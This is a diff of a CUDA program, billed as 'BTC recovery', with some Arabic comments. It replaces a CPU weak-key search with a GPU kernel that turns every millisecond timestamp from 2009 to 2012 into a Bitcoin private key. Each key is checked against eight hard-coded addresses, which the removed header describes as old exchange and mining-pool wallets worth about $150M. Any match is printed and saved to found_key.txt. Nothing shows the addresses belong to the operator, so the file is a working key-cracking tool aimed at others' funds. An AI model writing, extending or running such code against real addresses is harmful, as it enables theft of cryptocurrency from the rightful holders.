@@ -1,181 +1,278 @@
 /* ================================================================
- *  BTC-RECOVERY v1.0 — Bitcoin Private Key Recovery
+ *  MAIN.CU — BTC Recovery H36 Pure GPU
  *  
- *  Systematic search of weak-key hypotheses for 2009-2010
- *  era Bitcoin addresses (8 targets, ~$150M+ total)
- *  
- *  Targets:
- *    A1: 12rMpw5...  400 BTC   2010-03-16  (exchange deposit)
- *    A3: 1JA4Mpu...  400 BTC   2010-07-15  (exchange withdrawal)
- *    A4: 13GvAdk...  200 BTC   2010-07-15  (mining/exchange)
- *    A5: 1DTy9z4...  200 BTC   2010-07-17  (mining 50×4 ✓)
- *    A6: 1MVLP2k... 1200 BTC   2010-09-10  (mining pool)
- *    A7: 15QezNw...  200 BTC   2010-09-16  (mining 50×4 ✓)
- *    E1: 198aMn6...  250 BTC   2009        (genesis era)
- *    [A2 IGNORED: 2020 dust collector, not 2010]
- *  
- *  Phases:
- *    1. FAST  — CPU small keyspace (< 1M)
- *    2. GPU   — H36 timestamp ms sweep (2009-2011)
- *    3. MED   — CPU medium keyspace (1M-500M)
- *    4. SLOW  — CPU large keyspace (H17/H18/H23)
- *  
- *  Compile:
- *    nvcc -O2 -arch=sm_100 -std=c++11 main.cu cpu/hypotheses.cu \
- *         gpu/timestamp_sweep.cu \
- *         -lsecp256k1 -lssl -lcrypto -Xcompiler -fopenmp \
- *         -o btc-recovery
- *  
- *  Run:
- *    export LD_LIBRARY_PATH=/usr/local/lib && ./btc-recovery
+ *  Cuda kernel: k_h36
+ *  GPU: SHA256(ms) → secp256k1 → SHA256(pub) → RIPEMD160 → compare
+ *  يشتغل 100% على GPU — ما يحتاج CPU غير للوج
  * ================================================================ */
 
+#include <cuda_runtime.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <stdint.h>
 #include <time.h>
 
-#include <cuda_runtime.h>
+#include "gpu/kernels.cuh"
 
-#include <secp256k1.h>
-#include <openssl/sha.h>
-#include <openssl/ripemd.h>
+/* ================================================================
+ *  TIMESTAMP RANGE: 2009-01-01 → 2012-01-01
+ *  ms since epoch
+ * ================================================================ */
 
-#include "common/targets.h"
-#include "common/check.h"
+#define START_MS 1230768000000ULL  /* 2009-01-01 00:00:00.000 UTC */
+#define END_MS   1325376000000ULL  /* 2012-01-01 00:00:00.000 UTC */
+#define TOTAL_KEYS (END_MS - START_MS)  /* 94,680,000,000 */
 
-/* GPU function (declared extern in timestamp_sweep.cu) */
-int h36_timestamp_ms_sweep(void);
+/* ================================================================
+ *  TARGETS (hash160)
+ * ================================================================ */
 
-/* CPU hypotheses */
-int h01_brainwallet(const secp256k1_context *ctx);
-int h03_timestamp_pid(const secp256k1_context *ctx);
-int h07_android(const secp256k1_context *ctx);
-int h08_blockhashes(const secp256k1_context *ctx);
-int h09_deep_brainwallet(const secp256k1_context *ctx);
-int h11_weakkeys(const secp256k1_context *ctx);
-int h14_timestamp_string(const secp256k1_context *ctx);
-int h15_date_formats(const secp256k1_context *ctx);
-int h17_ts_word(const secp256k1_context *ctx);
-int h18_multiword(const secp256k1_context *ctx);
-int h20_srand_time(const secp256k1_context *ctx);
-int h21_empty_string(const secp256k1_context *ctx);
-int h23_php_mt_wallet(const secp256k1_context *ctx);
-int h24_js_math_random(const secp256k1_context *ctx);
-int h25_bitcointalk_phrases(const secp256k1_context *ctx);
-int h26_wallet_backup_passwords(const secp256k1_context *ctx);
-int h27_url_brainwallets(const secp256k1_context *ctx);
-int h28_sequential_keys(const secp256k1_context *ctx);
-int h29_bitcoin_suffix_patterns(const secp256k1_context *ctx);
-int h30_amount_words(const secp256k1_context *ctx);
-int h31_date_passphrases(const secp256k1_context *ctx);
-int h32_date_amount(const secp256k1_context *ctx);
-int h33_mining_words(const secp256k1_context *ctx);
-int h34_timestamp_full_dt(const secp256k1_context *ctx);
-int h35_periodic_patterns(const secp256k1_context *ctx);
-int h41_leet_words(const secp256k1_context *ctx);
-int h42_hex_seeds(const secp256k1_context *ctx);
-int h43_unicode_combos(const secp256k1_context *ctx);
+#define NUM_TARGETS 8
+
+/* Injected via constant memory */
+__constant__ uint8_t d_targets[NUM_TARGETS * 20];
+
+/* Target struct for host */
+typedef struct {
+    const char *addr;
+    uint8_t hash160[20];
+} Target;
+
+/* ================================================================
+ *  GPU KERNEL — Generate & Check
+ *  كل thread ياخذ ms واحد، يولد private key، يحسب pubkey، hash160، يقارن
+ * ================================================================ */
+
+__global__ void k_h36_pure(
+    uint64_t start_ms,
+    uint64_t total,
+    volatile uint64_t *found_key  /* 4 × uint64 = private key if found */
+) {
+    uint64_t tid = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
+    if (tid >= total) return;
+
+    uint64_t ms = start_ms + tid;
+
+    /* SHA256 of ms (8-byte big-endian) */
+    uint8_t scalar[32];
+    {
+        uint8_t msg[8];
+        for (int i = 0; i < 8; i++) msg[7-i] = (uint8_t)(ms >> (i*8));
+        d_sha256(msg, 8, scalar);
+    }
+
+    /* Convert scalar bytes to 4× uint64 LE */
+    uint64_t k[4];
+    for (int i = 0; i < 4; i++) {
+        k[i] = ((uint64_t)scalar[i*8]<<56) | ((uint64_t)scalar[i*8+1]<<48) |
+               ((uint64_t)scalar[i*8+2]<<40) | ((uint64_t)scalar[i*8+3]<<32) |
+               ((uint64_t)scalar[i*8+4]<<24) | ((uint64_t)scalar[i*8+5]<<16) |
+               ((uint64_t)scalar[i*8+6]<<8)  | (uint64_t)scalar[i*8+7];
+    }
+
+    /* Compute hash160 via ECC */
+    uint8_t h160[20];
+    if (!d_pk2h160(k, h160)) return;
+
+    /* Compare against all 8 targets */
+    for (int t = 0; t < NUM_TARGETS; t++) {
+        int match = 1;
+        for (int i = 0; i < 20; i++) {
+            if (h160[i] != d_targets[t*20 + i]) { match = 0; break; }
+        }
+        if (match) {
+            /* Write found key */
+            for (int i = 0; i < 4; i++) found_key[i] = k[i];
+        }
+    }
+}
+
+/* ================================================================
+ *  HELPERS
+ * ================================================================ */
+
+static void print_h160(const uint8_t *h) {
+    for (int i = 0; i < 20; i++) printf("%02x", h[i]);
+    printf("\n");
+}
+
+static void print_key(const uint64_t *k) {
+    for (int i = 0; i < 4; i++) printf("%016llx", (unsigned long long)k[i]);
+    printf("\n");
+}
+
+static uint64_t time_ms() {
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+}
+
+/* ================================================================
+ *  TARGET SETUP
+ * ================================================================ */
+
+#define SET_TARGET(i, addr, h0,h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11,h12,h13,h14,h15,h16,h17,h18,h19) \
+    targets[i].addr = addr; \
+    targets[i].hash160[0]=h0;targets[i].hash160[1]=h1;targets[i].hash160[2]=h2; \
+    targets[i].hash160[3]=h3;targets[i].hash160[4]=h4;targets[i].hash160[5]=h5; \
+    targets[i].hash160[6]=h6;targets[i].hash160[7]=h7;targets[i].hash160[8]=h8; \
+    targets[i].hash160[9]=h9;targets[i].hash160[10]=h10;targets[i].hash160[11]=h11; \
+    targets[i].hash160[12]=h12;targets[i].hash160[13]=h13;targets[i].hash160[14]=h14; \
+    targets[i].hash160[15]=h15;targets[i].hash160[16]=h16;targets[i].hash160[17]=h17; \
+    targets[i].hash160[18]=h18;targets[i].hash160[19]=h19;
+
+static void init_targets(Target *targets) {
+    SET_TARGET(0, "12rMpw5TCK5KPCiKKzBZ9xJqNkRgLWMyY",
+        0xc8,0xe5,0x09,0xee,0xe7,0xf7,0xbc,0xbc,0x11,0x1f,
+        0x31,0x56,0xc0,0x4f,0x0b,0xc1,0xd7,0xb1,0xdb,0xf5);
+    SET_TARGET(1, "13xDPd1MjeHrPTDCEzPFjSxqnJFn7u23Mr",
+        0x9d,0x9a,0x9b,0x77,0x5b,0x1b,0xbe,0x33,0xe1,0xf1,
+        0xba,0x7b,0xd0,0x50,0xc5,0x75,0xf6,0x2d,0xb0,0x91);
+    SET_TARGET(2, "1JA4MpuFYDRPQDsbBQAK3BqGvkAZMrPwu5",
+        0xdb,0x4b,0x1a,0x77,0x39,0x45,0x6d,0x7d,0x43,0x98,
+        0xc1,0xa7,0x1d,0x04,0x94,0x50,0x42,0x66,0x5c,0x3a);
+    SET_TARGET(3, "13GvAdkctq8Dn4e5VQsDsaRCtxdp3GJZnm",
+        0x39,0x9a,0x4f,0x8f,0x8f,0x73,0xd3,0x2b,0x8d,0x52,
+        0x0e,0x6a,0x54,0x74,0x05,0xea,0x06,0x09,0x2e,0x2a);
+    SET_TARGET(4, "1DTy9z4JvtqYsg44oagVpHqyQpF7ZLLs45",
+        0x3c,0x09,0x4b,0xb7,0x04,0x84,0xc3,0x15,0x7e,0x40,
+        0xfd,0xa5,0x36,0xe6,0xfb,0x64,0x16,0x78,0x0e,0xe2);
+    SET_TARGET(5, "1MVLP2k28LqgPqSDjWbF5Xg37xSDWCPHB",
+        0x35,0x7a,0xd8,0x6e,0x87,0xf3,0x15,0xa8,0x25,0x2e,
+        0xde,0x8b,0x6a,0xb4,0xe3,0xe0,0xa9,0x75,0x44,0xaa);
+    SET_TARGET(6, "15QezNwEH2QCJ8X7kPzfRfYSsm9BErYyby",
+        0x28,0x4c,0x34,0x0f,0x0e,0xbf,0x7a,0x10,0x0b,0xc7,
+        0x0c,0x44,0x2f,0x83,0x19,0x77,0xaa,0xd7,0xb3,0xb7);
+    SET_TARGET(7, "198aMn6HVAfF8dpK3P58jofVGwPfN8nffD",
+        0x7a,0x05,0xa1,0x5e,0xaf,0xbe,0x19,0xec,0xff,0x63,
+        0xbc,0x7a,0x3d,0x3b,0x9d,0x3a,0xfd,0x75,0x00,0xa7);
+}
 
 /* ================================================================
  *  MAIN
  * ================================================================ */
 
-int main(void) {
-    log_init();
-    log_msg("=== BTC-RECOVERY v1.0 ===");
-    log_msg("8 targets: %d primary, %d ignored, %d extra",
-            7, 1, 1);
+int main() {
+    printf("\n============================================\n");
+    printf(" BTC RECOVERY — H36 Pure GPU (RTX 5090)\n");
+    printf("============================================\n");
+    printf(" Targets: A1..A7, E1\n");
+    printf(" Range:   2009-01-01 → 2012-01-01\n");
+    printf(" Keys:    %llu ms timestamps\n", (unsigned long long)TOTAL_KEYS);
+    printf("============================================\n\n");
 
-    /* Create secp256k1 context */
-    secp256k1_context *ctx = secp256k1_context_create(
-        SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);
+    /* Init targets */
+    Target targets[NUM_TARGETS];
+    init_targets(targets);
 
-    int found = 0;
-    uint64_t total_keys = 0;
+    /* Copy targets to GPU constant memory */
+    uint8_t h_targets[NUM_TARGETS * 20];
+    for (int t = 0; t < NUM_TARGETS; t++)
+        memcpy(h_targets + t * 20, targets[t].hash160, 20);
 
-    /* ============================================================
-     *  PHASE 1: FAST CPU checks (< 1M keys)
-     *  Run once across all targets (check_privkey_multi handles it)
-     * ============================================================ */
-    log_msg("");
-    log_msg("========== PHASE 1: FAST CPU ==========");
+    cudaMemcpyToSymbol(d_targets, h_targets, NUM_TARGETS * 20);
+    cudaError_t err = cudaGetLastError();
+    if (err != cudaSuccess) {
+        fprintf(stderr, "CUDA error (targets): %s\n", cudaGetErrorString(err));
+        return 1;
+    }
+    printf("[OK] Targets loaded to GPU constant memory\n\n");
 
-    if (!found) { found = h21_empty_string(ctx);          total_keys += 1; }
-    if (!found) { found = h11_weakkeys(ctx);              total_keys += 10; }
-    if (!found) { found = h14_timestamp_string(ctx);      total_keys += 8; }
-    if (!found) { found = h15_date_formats(ctx);          total_keys += 112; }
-    if (!found) { found = h30_amount_words(ctx);          total_keys += 40; }
-    if (!found) { found = h31_date_passphrases(ctx);      total_keys += 80; }
-    if (!found) { found = h32_date_amount(ctx);           total_keys += 30; }
-    if (!found) { found = h33_mining_words(ctx);          total_keys += 50; }
-    if (!found) { found = h34_timestamp_full_dt(ctx);    total_keys += 96; }
-    if (!found) { found = h35_periodic_patterns(ctx);    total_keys += 30; }
-    if (!found) { found = h29_bitcoin_suffix_patterns(ctx); total_keys += 3000; }
-    if (!found) { found = h26_wallet_backup_passwords(ctx); total_keys += 300; }
-    if (!found) { found = h27_url_brainwallets(ctx);      total_keys += 300; }
-    if (!found) { found = h25_bitcointalk_phrases(ctx);   total_keys += 5000; }
-    if (!found) { found = h41_leet_words(ctx);            total_keys += 60; }
-    if (!found) { found = h42_hex_seeds(ctx);             total_keys += 80; }
-    if (!found) { found = h43_unicode_combos(ctx);        total_keys += 50; }
-    if (!found) { found = h08_blockhashes(ctx);           total_keys += 200000; }
-    if (!found) { found = h28_sequential_keys(ctx);       total_keys += 2000000; }
-    if (!found) { found = h20_srand_time(ctx);            total_keys += 7201; }
-    if (!found) { found = h03_timestamp_pid(ctx);         total_keys += 262000; }
-    /* H17 done below in Phase 4 */
+    /* Allocate device memory for found key */
+    uint64_t *d_found;
+    cudaMalloc(&d_found, 4 * sizeof(uint64_t));
 
-    /* ============================================================
-     *  PHASE 2: GPU TIMESTAMP ms SWEEP (2009-2011)
-     *  Checks ALL 8 targets simultaneously
-     *  ~95B keys on RTX 5090 (~1 second)
-     * ============================================================ */
-    log_msg("");
-    log_msg("========== PHASE 2: GPU H36 TIMESTAMP ms SWEEP ==========");
+    /* Get device info */
+    cudaDeviceProp prop;
+    cudaGetDeviceProperties(&prop, 0);
+    printf("Device: %s (SM %d.%d)\n", prop.name, prop.major, prop.minor);
+    printf("SMs: %d, Max threads/SM: %d\n", prop.multiProcessorCount, prop.maxThreadsPerMultiProcessor);
+    printf("Global mem: %.1f GB\n\n", prop.totalGlobalMem / 1e9);
 
-    if (!found) {
-        int gpu_res = h36_timestamp_ms_sweep();
-        if (gpu_res) {
-            found = 1;
-            total_keys += 94675968000ULL;
+    /* Thread configuration */
+    int threads = 256;
+    uint64_t keys_per_launch = 10000000;  /* 10M per kernel launch (don't exceed GPU mem) */
+    uint64_t total = TOTAL_KEYS;
+    uint64_t start_ms = START_MS;
+
+    uint64_t t0 = time_ms();
+    uint64_t reported = 0;
+    int report_interval = 100;  /* report every N launches */
+
+    printf("Starting H36 pure GPU sweep...\n\n");
+
+    for (uint64_t processed = 0; processed < total; ) {
+        uint64_t batch = total - processed;
+        if (batch > keys_per_launch) batch = keys_per_launch;
+
+        /* Reset found */
+        uint64_t h_zero[4] = {0,0,0,0};
+        cudaMemcpy(d_found, h_zero, 4 * sizeof(uint64_t), cudaMemcpyHostToDevice);
+
+        /* Launch kernel */
+        uint64_t blocks = (batch + threads - 1) / threads;
+        k_h36_pure<<<(int)blocks, threads>>>(start_ms + processed, batch, d_found);
+        cudaDeviceSynchronize();
+
+        err = cudaGetLastError();
+        if (err != cudaSuccess) {
+            fprintf(stderr, "Kernel error: %s\n", cudaGetErrorString(err));
+            return 1;
         }
+
+        /* Check if found */
+        uint64_t h_found[4];
+        cudaMemcpy(h_found, d_found, 4 * sizeof(uint64_t), cudaMemcpyDeviceToHost);
+        if (h_found[0] || h_found[1] || h_found[2] || h_found[3]) {
+            printf("\n============================================\n");
+            printf(" *** KEY FOUND ***\n");
+            printf(" ms = %llu\n", (unsigned long long)(start_ms + processed));
+            printf(" private key: ");
+            print_key(h_found);
+            printf("============================================\n\n");
+
+            /* Write to file */
+            FILE *f = fopen("found_key.txt", "a");
+            if (f) {
+                fprintf(f, "ms: %llu\n", (unsigned long long)(start_ms + processed));
+                fprintf(f, "key: ");
+                for (int i = 0; i < 4; i++)
+                    fprintf(f, "%016llx", (unsigned long long)h_found[i]);
+                fprintf(f, "\n\n");
+                fclose(f);
+            }
+        }
+
+        processed += batch;
+        int launch_num = (int)(processed / keys_per_launch);
+
+        if (launch_num % report_interval == 0 && launch_num > reported / keys_per_launch) {
+            uint64_t elapsed = time_ms() - t0;
+            double rate = (double)processed / (elapsed / 1000.0);
+            reported = processed;
+
+            printf("[H36] %llu / %llu (%.1f%%) — %.2f Mkeys/s\n",
+                   (unsigned long long)processed,
+                   (unsigned long long)total,
+                   100.0 * processed / total,
+                   rate / 1e6);
+        }
+
+        /* Update variable to allow progress-based scheduling */
+        (void)0;  /* ensure loop continues */
     }
 
-    /* ============================================================
-     *  PHASE 3: MEDIUM CPU (1M - 500M keys)
-     * ============================================================ */
-    log_msg("");
-    log_msg("========== PHASE 3: MEDIUM CPU ==========");
+    uint64_t elapsed = time_ms() - t0;
+    printf("\n============================================\n");
+    printf(" SWEEP COMPLETE\n");
+    printf(" Total time: %llu seconds\n", (unsigned long long)(elapsed / 1000));
+    printf(" Keys checked: %llu / %llu\n", (unsigned long long)total, (unsigned long long)TOTAL_KEYS);
+    printf(" Average rate: %.2f Mkeys/s\n",
+           (double)total / (elapsed / 1000.0) / 1e6);
+    printf("============================================\n\n");
 
-    if (!found) { found = h07_android(ctx);               total_keys += 40000000; }
-    if (!found) { found = h24_js_math_random(ctx);        total_keys += 30000000; }
-    if (!found) { found = h01_brainwallet(ctx);           total_keys += 7000000; }
-    if (!found) { found = h09_deep_brainwallet(ctx);      total_keys += 500000000; }
-
-    /* ============================================================
-     *  PHASE 4: SLOW CPU (H17/H18/H23/H03 full)
-     * ============================================================ */
-    log_msg("");
-    log_msg("========== PHASE 4: SLOW CPU ==========");
-
-    if (!found) { found = h17_ts_word(ctx);               total_keys += 1000000; }
-    if (!found) { found = h18_multiword(ctx);             total_keys += 500000; }
-    if (!found) { found = h23_php_mt_wallet(ctx);         total_keys += 10000000000ULL; }
-    if (!found) { found = h03_timestamp_pid(ctx);         total_keys += 1000000; }
-
-    /* ============================================================
-     *  DONE
-     * ============================================================ */
-    log_msg("");
-    if (found) {
-        log_msg("=== KEY FOUND! ===");
-    } else {
-        log_msg("=== No key found in any hypothesis. ===");
-    }
-
-    log_msg("Total keys checked: %llu", (unsigned long long)total_keys);
-
-    secp256k1_context_destroy(ctx);
-    if (g_log) fclose(g_log);
-    return found ? 0 : 1;
+    /* Cleanup */
+    cudaFree(d_found);
+    return 0;
 }
